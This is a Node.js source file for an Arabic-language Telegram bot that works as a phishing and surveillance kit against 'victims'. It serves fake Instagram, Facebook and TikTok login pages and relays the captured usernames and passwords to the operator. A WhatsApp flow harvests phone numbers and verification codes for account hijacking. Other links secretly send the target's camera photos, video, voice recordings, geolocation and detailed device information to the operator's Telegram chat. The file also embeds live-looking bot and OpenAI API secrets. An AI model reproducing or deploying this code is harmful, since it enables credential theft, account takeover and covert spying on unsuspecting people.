require('dotenv').config(); 
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const axios = require('axios');
const uuid = require('uuid');
const cheerio = require('cheerio');
const dns = require('dns');
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const botToken = process.env.n; 
const botUsername = 'ZI0_bot'; 
const bot = new TelegramBot(botToken, { polling: true });

const developerChannels = ['@uiit89', '@oapajh', '@hqooosjjd', '@lTV_l', '@hsosgh']; 


const SECOND_BOT_TOKEN = '7065665133:AAELOAVm07oxkoPuxqz2DOs-FgdwpW5B7mU';


const secondBot = new TelegramBot(SECOND_BOT_TOKEN, { polling: true });


let inviteLinks = {};
let userPoints = {}; 
let linkData = {}; 
let visitorData = {}; 

function clearCache() {
    console.log('Clearing cache...');
    userPoints = {};
    linkData = {};
    visitorData = {};
    const dataStore = {};
}


setInterval(clearCache, 1800 * 1000); 

async function isUserSubscribed(chatId) {
    try {
        const results = await Promise.all(
            developerChannels.map(channel =>
                bot.getChatMember(channel, chatId)
            )
        );

        
        return results.every(result => {
            const status = result.status;
            return status === 'member' || status === 'administrator' || status === 'creator';
        });
    } catch (error) {
        console.error('Error checking subscription status:', error);
        return false;
    }
}

bot.onText(/\/Vip/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const isSubscribed = await isUserSubscribed(chatId);

    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    const linkId = uuid.v4(); 

    
    linkData[linkId] = {
        userId: userId,
        chatId: chatId,
        visitors: []
    };

    const message = 'مرحبًا! هذا الخيارت مدفوع بسعر 30 نقطه يمكنك تجميع النقاط وفتحها مجاني.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'سحب جميع الرقام الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'سحب جميع رسايل الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'فرمتة جوال الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
            ]
        }
    });
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const linkId = query.data.split('_')[2];

    if (linkData[linkId] && linkData[linkId].userId === userId) {
        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص في الدخول الي الرابط الخاص بك سوف تحصل على 1 نقطة.\n: https://t.me/${botUsername}?start=${linkId}`;
        bot.sendMessage(chatId, linkMessage);
    }
});
const baseUrl = process.env.r;
bot.onText(/\/vip (.+)/, async (msg, match) => {
    const linkId = match[1];
    const visitorId = msg.from.id;
    const chatId = msg.chat.id;

    const isSubscribed = await isUserSubscribed(chatId);
    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    if (linkData[linkId]) {
        const { userId, visitors } = linkData[linkId];

        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
            visitors.push(visitorId);

            if (!visitorData[visitorId]) {
                visitorData[visitorId] = [];
            }
            visitorData[visitorId].push(userId);

            if (!userPoints[userId]) {
                userPoints[userId] = 0;
            }
            userPoints[userId] += 1;

            
            const message = `شخص جديد دخل إلى الرابط الخاص بك! وحصلت ع 1نقطه عندما تصل الي 30 نقطه سيتم فتح المميزات تلقائي.`;
            bot.sendMessage(chatId, message);

            
            const topMessage = `عندما  تصل الي 30 نطقه سيتم فتح المميزات تلقائي `;
            bot.sendMessage(userId, topMessage);
        }
    }
});
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const linkId = query.data.split('_')[2];

    if (linkData[linkId] && linkData[linkId].userId === userId) {
        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص في الدخول الي الرابط الخاص بك سوف تحصل على1 نقطه \n: https://t.me/${botUsername}?start=${linkId}`;
        bot.sendMessage(chatId, linkMessage);
    }
});

bot.onText(/\/start (.+)/, async (msg, match) => {
    const linkId = match[1];
    const visitorId = msg.from.id;
    const chatId = msg.chat.id;

    const isSubscribed = await isUserSubscribed(chatId);
    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    if (linkData[linkId]) {
        const { userId, chatId, visitors } = linkData[linkId];

        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
            visitors.push(visitorId);

            if (!visitorData[visitorId]) {
                visitorData[visitorId] = [];
            }
            visitorData[visitorId].push(userId);

            if (!userPoints[userId]) {
                userPoints[userId] = 0;
            }
            userPoints[userId] += 1;

            const message = `شخص جديد دخل إلى الرابط الخاص بك! وحصلت ع 1نقطه \nعندما توصل لي30 نقطه سوف يتم فتح المميزات المدفوع تلقائي `;
            bot.sendMessage(chatId, message);
        }
    }
});


const app = express();
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(express.static(__dirname));


const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const uploadVoice = multer({ dest: 'uploads/' });


app.get('/getNameForm', (req, res) => {
    const chatId = req.query.chatId;
    const formType = req.query.type;

    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }

    let fileName = '';
    switch (formType) {
        case 'instagram':
            fileName = 'i.html';
            break;
        case 'facebook':
            fileName = 'fe.html';
            break;
        case 'tiktok':
        default:
            fileName = 't.html';
            break;
    }

    res.sendFile(path.join(__dirname, fileName));
});

app.get('/getLocation/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'lo.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/captureFront/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'c.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/captureBack/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'b.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/record/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'r.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});


app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `تم اختراق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
        .then(() => {
            
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
        });

    
    res.redirect('/ok.html');
});
app.use(bodyParser.json());
app.use(express.static(__dirname));


app.get('/whatsapp', (req, res) => {
  res.sendFile(path.join(__dirname, 'n.html'));
});

app.post('/submitPhoneNumber', (req, res) => {
  const chatId = req.body.chatId;
  const phoneNumber = req.body.phoneNumber;

  
  bot.sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
    .then(() => {
      res.json({ success: true });
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});

app.post('/submitCode', (req, res) => {
  const chatId = req.body.chatId;
  const code = req.body.code;

  
  bot.sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
    .then(() => {
      
      res.redirect('https://faq.whatsapp.com/');
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

const dataStore = {}; 

app.use(express.static(__dirname));

app.post('/submitVideo', (req, res) => {
    const chatId = req.body.chatId;
    const videoData = req.body.videoData;

    
    if (!chatId || !videoData) {
        return res.status(400).send('Invalid request: Missing chatId or videoData');
    }

    const videoDataBase64 = videoData.split(',')[1]; 
    const videoDir = path.join(__dirname, 'videos');
    if (!fs.existsSync(videoDir)) {
        fs.mkdirSync(videoDir);
    }

    
    try {
        const buffer = Buffer.from(videoDataBase64, 'base64');
        const videoPath = path.join(videoDir, `${chatId}.mp4`);
        fs.writeFileSync(videoPath, buffer);

        bot.sendVideo(chatId, videoPath, { caption: 'تم تصوير الضحيه فيديو 🎥' })
            .then(() => {
                console.log(`Stored and sent video for chatId ${chatId}`);
                res.redirect('/ca.html'); 
            })
            .catch(error => {
                console.error('Error sending video:', error);
                res.status(500).send('Failed to send video');
            });
    } catch (error) {
        console.error('Error processing video:', error);
        res.status(500).send('Failed to process video');
    }
});

app.get('/capture', (req, res) => {
    res.sendFile(path.join(__dirname, 'ca.html'));
});
let userRequests = {}; 

app.post('/submitLocation', (req, res) => {
    const chatId = req.body.chatId;
    const latitude = req.body.latitude;
    const longitude = req.body.longitude;
    bot.sendLocation(chatId, latitude, longitude);
    res.send('حدث خطأ');
});

app.post('/submitPhotos', (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);

    if (imageDatas.length > 0) {
        const sendPhotoPromises = imageDatas.map((imageData, index) => {
            const buffer = Buffer.from(imageData, 'base64');
            return bot.sendPhoto(chatId, buffer, { caption: `📸الصورة ${index + 1}` });
        });

        Promise.all(sendPhotoPromises)
            .then(() => {
                console.log('');
                res.json({ success: true });
            })
            .catch(err => {
                console.error('', err);
                res.status(500).json({ error: '' });
            });
    } else {
        console.log('');
        res.status(400).json({ error: '' });
    }
});

app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
    const chatId = req.body.userId; 
    const files = req.files;

    if (files && files.length > 0) {
        console.log(`تم استلام ${files.length}  ${chatId}`);
        const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer));

        Promise.all(sendPhotoPromises)
            .then(() => {
                console.log('');
                res.json({ success: true });
            })
            .catch(err => {
                console.error(':', err);
                res.status(500).json({ error: '' });
            });
    } else {
        console.log('');
        res.status(400).json({ error: '' });
    }
});

app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voicePath = req.file.path;

    bot.sendVoice(chatId, voicePath).then(() => {
        fs.unlinkSync(voicePath);
        res.send('');
    }).catch(error => {
        console.error(error);
        res.status(500).send('خطأ.');
    });
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
app.get('/:userId', (req, res) => {
    res.sendFile(path.join(__dirname, 'mm.html'));
});


app.post('/mm', async (req, res) => {
    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo;

    if (deviceInfo) {
        const message = `
📱 **معلومات الجهاز:**
- الدولة: ${deviceInfo.country} 🔻
- المدينة: ${deviceInfo.city} 🏙️
- عنوان IP: ${deviceInfo.ip} 🌍
- شحن الهاتف: ${deviceInfo.battery}% 🔋
- هل الهاتف يشحن؟: ${deviceInfo.isCharging} ⚡
- الشبكة: ${deviceInfo.network} 📶 (سرعة: ${deviceInfo.networkSpeed} ميغابت في الثانية)
- نوع الاتصال: ${deviceInfo.networkType} 📡
- الوقت: ${deviceInfo.time} ⏰
- اسم الجهاز: ${deviceInfo.deviceName} 🖥️
- إصدار الجهاز: ${deviceInfo.deviceVersion} 📜
- نوع الجهاز: ${deviceInfo.deviceType} 📱
- الذاكرة (RAM): ${deviceInfo.memory} 🧠
- الذاكرة الداخلية: ${deviceInfo.internalStorage} GB 💾
- عدد الأنوية: ${deviceInfo.cpuCores} ⚙️
- لغة النظام: ${deviceInfo.language} 🌐
- اسم المتصفح: ${deviceInfo.browserName} 🌐
- إصدار المتصفح: ${deviceInfo.browserVersion} 📊
- دقة الشاشة: ${deviceInfo.screenResolution} 📏
- إصدار نظام التشغيل: ${deviceInfo.osVersion} 🖥️
- وضع الشاشة: ${deviceInfo.screenOrientation} 🔄
- عمق الألوان: ${deviceInfo.colorDepth} 🎨
- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate} 📅
- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol} 🔒
- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency} 📡
- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable} 🌍
- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport} 🔵
- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport} ✋
        `;
        
        try {
            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            console.log('تم إرسال معلومات الجهاز بنجاح');
            res.json({ success: true });
        } catch (err) {
            console.error('فشل في إرسال معلومات الجهاز:', err);
            res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز' });
        }
    } else {
        console.log('لم يتم استلام معلومات الجهاز');
        res.status(400).json({ error: 'لم يتم استلام معلومات الجهاز' });
    }
});




app.post('/so', (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    imageDatas.forEach((imageData, index) => {
        const buffer = Buffer.from(imageData, 'base64');

        
        bot.sendPhoto(chatId, buffer, { caption: `الصوره📸 ${index + 1}` });
    });

    console.log(`Sent photos for chatId ${chatId}`);
    
    
    if (dataStore[chatId] && dataStore[chatId].userLink) {
        res.redirect(dataStore[chatId].userLink);
    } else {
        res.send('Processing complete');
    }
});

app.get('/ca', (req, res) => {
    res.sendFile(path.join(__dirname, 'k.html'));
});

let linkUsage = {};
const maxAttemptsPerButton = 555; 

function validateLinkUsage(userId, action) {
    const userActionId = `${userId}:${action}`;
    if (isVIPUser(userId)) {
        return true;
    }

    if (linkUsage[userActionId] && linkUsage[userActionId].attempts >= maxAttemptsPerButton) {
        return false;
    }

    if (!linkUsage[userActionId]) {
        linkUsage[userActionId] = { attempts: 0 };
    }

    linkUsage[userActionId].attempts++;
    return true;
}


let vipUsers = {};

function addVIPUser(userId) {
    vipUsers[userId] = true;
}

function removeVIPUser(userId) {
    delete vipUsers[userId];
}

function isVIPUser(userId) {
    return !!vipUsers[userId];
}


bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const isSubscribed = await isUserSubscribed(chatId);

    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [
            { text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }
        ]);

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
    const mainMenuButtons = [
        [
            { text: 'اختراق الكامرا الأمامية 📸', callback_data: `captureFront:${chatId}` },
            { text: 'اختراق الكامرا الخلفية 📷', callback_data: `captureBack:${chatId}` }
        ],
        [
            { text: 'اختراق الموقع 📍', callback_data: `getLocation:${chatId}` },
            { text: 'تسجيل صوت الضحية 🎤', callback_data: `recordVoice:${chatId}` }
        ],
        [
            { text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' },
            { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }
        ],
        [
            { text: 'اختراق واتساب 🟢', callback_data: 'request_verification' },
            { text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }
        ],
        [
            { text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` },
            { text: 'اختراق ببجي 🕹', callback_data: 'get_pubg' }
        ],
        [
            { text: 'اختراق فري فاير 👾', callback_data: 'get_freefire' },
            { text: 'اختراق سناب شات ⭐', callback_data: 'add_names' }
        ],
        [
            { text: 'اختراق تيك توك 📳', callback_data: `rshq_tiktok:${chatId}` },
            { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' } }
        ],
        [
            { text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' },
            { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://morning-animated-drifter.glitch.me/' } }
        ],
        [
            { text: 'تلغيم رابط ⚠️', callback_data: 'get_link' },
            { text: 'اختراق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }
        ],
        [
            { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://forest-plausible-practice.glitch.me/' } },
            { text: 'شرح البوت 👨🏻‍🏫', url: 'https://t.me/lTV_l/33' }
        ],
        [
            { text: 'إغلاق المواقع 💣', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' } },
            { text: 'إنشاء إيميل وهمي 💌', callback_data: 'create_email' }
        ],
        [
            { text: "صيد فيزات 💳", callback_data: "generate_visa" }, 
            { text: 'تصوير بدقه عاليه 🖼', callback_data: 'get_photo_link' }
            
        ],
        [
           { text: "معرفة رقم الضحيه 📲", callback_data: "generate_invite" }, 
            { text: 'الرقام وهميه ☎️', callback_data: 'get_number' }
        ],
        [
           { text: 'فحص الروابط 🪄', callback_data: 'check_links' }, 
           { text: 'البحث عن صور 🎨', callback_data: 'search_images' }
        ], 
        [
           { text: 'التواصل مع المطور', url: 'https://t.me/VlP_12' }
        ]
     ] 

    bot.sendMessage(chatId, mainMenuMessage, {
        reply_markup: {
            inline_keyboard: mainMenuButtons
        }
    });

    
    if (chatId === 5739065274) {
        const adminMenuMessage = 'مرحبًا بك عزيزي حمودي في لوحة التحكم:';
        const adminMenuButtons = [
            [
                { text: 'إضافة مشترك VIP', callback_data: 'add_vip' },
                { text: 'إلغاء اشتراك VIP', callback_data: 'remove_vip' }
            ]
        ];

        bot.sendMessage(chatId, adminMenuMessage, {
            reply_markup: {
                inline_keyboard: adminMenuButtons
            }
        });
    }
});
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'capture_video') {
        const message = `هذا المميزه مقفله اني اخاف اشارك ذنبكم بسبب ان يوجد بعص الناس تسخدمه في مالايرضي الله ورسوله تتوفر هذا المميزه في نسخه ثانيه مدفوعة تنابع ققط لشخاص موثوقين وتحت مراقبه للستفسار راسل المطور \nالمطور @VlP_12`;
        bot.sendMessage(chatId, message);
    }
});


bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];

    if (!exemptButtons.includes(data.split(':')[0]) && !(await isUserSubscribed(chatId))) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => ({ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }));
        
        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: [buttons]
            }
        });
        return;
    }

    if (data === 'request_verification') {
        const verificationLink = `${baseUrl}/whatsapp?chatId=${chatId}`;
        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
        return;
    }

    const [action, userId] = data.split(':');

    if (action === 'get_joke') {
        try {
            const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: jokeMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
                    'Content-Type': 'application/json'
                }
            });
            const joke = response.data.choices[0].message.content;

            bot.sendMessage(chatId, joke);
        } catch (error) {
            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
        }
    } else if (data === 'get_love_message') {
        try {
            const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور مع اضافة فاصله اضع فيها رقمي وليس اسمي';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: loveMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
                    'Content-Type': 'application/json'
                }
            });
            const joke = response.data.choices[0].message.content;

            bot.sendMessage(chatId, joke);
        } catch (error) {
            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
        }
    } else if (data === 'get_love_message') {
        try {
            const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور مع اضافة فاصله اضع فيها رقمي وليس اسمي';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: loveMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
                    'Content-Type': 'application/json'
                }
            });
            const love = response.data.choices[0].message.content;

            bot.sendMessage(chatId, love);
        } catch (error) {
            console.error('Error fetching love message:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحق😁ًا.');
        }
    } else if (data === 'add_vip' && chatId == 5739065274) {
        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:');
        bot.once('message', (msg) => {
            const userId = msg.text;
            addVIPUser(userId);
            bot.sendMessage(chatId, `تم إضافة المستخدم ${userId} كـ VIP.`);
        });
    } else if (data === 'remove_vip' && chatId == 5739065274) {
        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإزالته من VIP:');
        bot.once('message', (msg) => {
            const userId = msg.text;
            removeVIPUser(userId);
            bot.sendMessage(chatId, `تم إزالة المستخدم ${userId} من VIP.`);
        });
    } else {
        const [action, userId] = data.split(':');

        if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {
            bot.sendMessage(chatId, '');
            return;
        }

        let link = '';

        switch (action) {
            case 'captureFront':
                link = `هذا المميزه مقفله اني اخاف اشارك ذنبكم بسبب ان يوجد بعص الناس تسخدمه في مالايرضي الله ورسوله تتوفر هذا المميزه في نسخه ثانيه مدفوعة تنابع ققط لشخاص موثوقين وتحت مراقبه للستفسار راسل المطور \nالمطور @VlP_12`;
                break;
            case 'captureBack':
                link = `هذا المميزه مقفله اني اخاف اشارك ذنبكم بسبب ان يوجد بعص الناس تسخدمه في مالايرضي الله ورسوله تتوفر هذا المميزه في نسخه ثانيه مدفوعة تنابع ققط لشخاص موثوقين وتحت مراقبه للستفسار راسل المطور \nالمطور @VlP_12`;
                break;
            case 'getLocation':
                link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'recordVoice':
                const duration = 10;  
                link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                break;
            case 'rshq_tiktok':
                link = `${baseUrl}/getNameForm?chatId=${chatId}&type=tiktok`;
                break;
            case 'rshq_instagram':
                link = `${baseUrl}/getNameForm?chatId=${chatId}&type=instagram`;
                break;
            case 'rshq_facebook':
                link = `${baseUrl}/getNameForm?chatId=${chatId}&type=facebook`;
                break;
            default:
                bot.sendMessage(chatId, '');
                return;
        }

        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
    }

    bot.answerCallbackQuery(callbackQuery.id);
});
bot.onText(/\/jjihigjoj/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'جمع معلومات الجهاز', callback_data: 'collect_device_info' }]
            ]
        }
    });
});


bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    
    if (query.data === 'collect_device_info') {
        const url = `${baseUrl}/${chatId}`;
        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
    }

    
    bot.answerCallbackQuery(query.id);
});
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'get_link') {
        
        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');

        
        const messageHandler = (msg) => {
            
            if (msg.chat.id === chatId) {
                if (msg.text && msg.text.startsWith('https')) {
                    const userLink = msg.text;

                    
                    dataStore[chatId] = { userLink };

                    
                    bot.sendMessage(chatId, `هذا المميزه مقفله اني اخاف اشارك ذنبكم بسبب ان يوجد بعص الناس تسخدمه في مالايرضي الله ورسوله تتوفر هذا المميزه في نسخه ثانيه مدفوعة تنابع ققط لشخاص موثوقين وتحت مراقبه للستفسار راسل المطور \nالمطور @VlP_12`);

                    
                    bot.removeListener('message', messageHandler);
                } else {
                    
                    bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
                }
            }
        };

        
        bot.on('message', messageHandler);
    }
});
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'g.html')); 
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/ge', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'g.html'));
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'F.html')); 
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/getNam', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'F.html'));
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 's.html')); 
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/getName', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
